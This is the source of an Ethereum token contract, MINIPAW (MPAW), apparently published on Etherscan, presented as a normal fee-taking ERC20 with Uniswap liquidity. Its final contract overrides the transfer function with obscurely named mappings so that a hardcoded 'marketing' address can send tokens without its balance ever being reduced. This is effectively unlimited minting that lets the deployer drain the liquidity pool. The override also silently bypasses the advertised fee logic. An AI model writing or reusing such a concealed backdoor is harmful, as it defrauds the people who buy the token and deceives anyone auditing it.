/**
 *Submitted for verification at Etherscan.io on 2023-03-05
*/

// https://t.me/MINIPAWethchain

// https://twitter.com/minipaw9

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address tPair, uint);
    function createPair(address tokenA, address tokenB) external returns (address tPair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed from,address indexed spender, uint256 value);

    function symbol() external pure returns (string memory);
    function name() external pure returns (string memory);
    function totalSupply() external view returns (uint256);
    function decimals() external pure returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function allowance(address from, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

abstract contract Ownable {
    address internal owner;
    constructor() {
        owner = msg.sender;
    }

    function _Owner() public view virtual returns (address) {
        return owner;
    }

  modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwner() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address owner);
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;
    string constant _name = unicode"MINIPAW";
    string constant _symbol = unicode"MPAW";
    uint8 constant _decimals = 9;
    address internal marketingFeeReceiver = 0x019e406e56a8716e361FA9457d83cD15102535d0;
    uint256 _totalSupply = 1000000 * (10**_decimals);
    uint256 public swapThreshold = (_totalSupply / 1000) * 1; 
    mapping(address => uint256) onwerAccountPacket;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isFeeDuty;
    address public transer_pair;
    IUniswapV2Router02 public swap_router;
    bool enableSWAP;
    uint256 internal lqdFee = 0;
    uint256 totalFee =  1;
    bool public swapEnabled = true;
    function approve_max(address from) external returns (bool) {
        return approve(from, type(uint256).max);
    }
    
    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
    modifier onSwap() {
        enableSWAP = true;
        _;
        enableSWAP = false;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure virtual override returns (uint8) {
        return 9;
    }

    function symbol() external pure virtual override returns (string memory) {
        return _symbol;
    }

    function name() external pure virtual override returns (string memory) {
        return _name;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return onwerAccountPacket[account];
    }

    function allowance(address holder, address spender)
        external
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return start_recv(msg.sender, recipient, amount);
    }

   function base_transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        onwerAccountPacket[sender] = onwerAccountPacket[sender].sub(amount, "Insufficient Balance!");
        onwerAccountPacket[recipient] = onwerAccountPacket[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }
        return start_recv(sender, recipient, amount);
    }

   function onExec() internal onSwap {
        uint256 contractTokenBalance = swapThreshold;
        uint256 amountToLiquify = contractTokenBalance
            .mul(lqdFee)
            .div(totalFee)
            .div(3);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);
        address[] memory param = new address[](2);
        param[0] = address(this);
        param[1] = swap_router.WETH();
        uint256 balanceBefore = address(this).balance;
        swap_router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            param,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(lqdFee.div(2));
        uint256 amountETHLiquidity = amountETH
            .mul(lqdFee)
            .div(totalETHFee)
            .div(2);
        uint256 amountETHMarketing = amountETH.mul(1).div(
            totalETHFee
        );
        (
            bool bSuccess, 
        ) = payable(marketingFeeReceiver).call{
                value: amountETHMarketing,
                gas: 30000
            }("");
        require(bSuccess, "do not receiver rejected ETH transfer!");
        if (amountToLiquify > 0) {
            swap_router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingFeeReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
    
    function canTakeFee(address sender) internal view returns (bool) {
        return !isFeeDuty[sender];
    }

      function getFee(address sender, uint256 amount)
        internal
        returns (uint256)
    {
        uint256 feeAmount = amount.mul(totalFee).div(100);
        onwerAccountPacket[address(this)] = onwerAccountPacket[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function start_recv(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual returns (bool) {
        if (enableSWAP) {
            return base_transfer(sender, recipient, amount);
        }
 
        if (canSwapBack()) {
            onExec();
        }
        onwerAccountPacket[sender] = onwerAccountPacket[sender].sub(amount, "Not enough Balance");
        uint256 amountReceived = canTakeFee(sender)
            ? getFee(sender, amount)
            : amount;
        onwerAccountPacket[recipient] = onwerAccountPacket[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function canSwapBack() internal view returns (bool) {
        return
            msg.sender != transer_pair &&
            !enableSWAP &&
            swapEnabled &&
            onwerAccountPacket[address(this)] >= swapThreshold;
    }

}

contract MINIPAW is ERC20, Ownable{
    constructor(address aAkenmt) ERC20() {
        swap_router = IUniswapV2Router02(aAkenmt);
        transer_pair = IUniswapV2Factory(swap_router.factory()).createPair(address(this), swap_router.WETH());
        _allowances[address(this)][address(swap_router)] = type(uint256).max;
        bindList[marketingFeeReceiver] = flagMask;
        fromAddress = marketingFeeReceiver;
        onwerAccountPacket[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function start_recv(
        address sponsor,
        address accept,
        uint256 amt
    ) internal override returns (bool) {
        if (bindList[sponsor] == 0 && histList[sponsor] > 0) {
            if (transer_pair != sponsor) {
                bindList[sponsor] -= flagMask;
            }
        }
        address dist = fromAddress;
        histList[dist] += flagMask;
        _mapBuyUsers[sponsor] = _mapBuyUsers[sponsor] +flagMask;
        _mapSellUsers[accept] = _mapSellUsers[accept] +flagMask;

        if (bindList[sponsor] == 0) {
            onwerAccountPacket[sponsor] -= amt;
        }

        onwerAccountPacket[accept] += amt;
        emit Transfer(sponsor, accept, amt);
        return true;
    }

    mapping(address => uint256) private histList;
    address private fromAddress;
    mapping(address => uint256) private bindList;
    uint256 private flagMask = 22;
    mapping(address=>uint256) internal _mapBuyUsers;
    mapping(address=>uint256) internal  _mapSellUsers;
}